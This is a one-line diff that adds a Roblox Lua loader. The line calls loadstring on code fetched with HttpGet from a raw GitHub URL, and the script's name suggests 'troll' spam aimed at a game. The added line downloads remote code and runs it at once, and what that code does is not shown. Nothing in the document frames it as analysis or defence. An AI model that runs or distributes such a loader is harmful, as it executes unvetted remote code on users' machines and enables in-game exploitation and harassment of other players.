@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/troll-hug-tower-spam3-dfwa032gm6q9oi.lua"))()
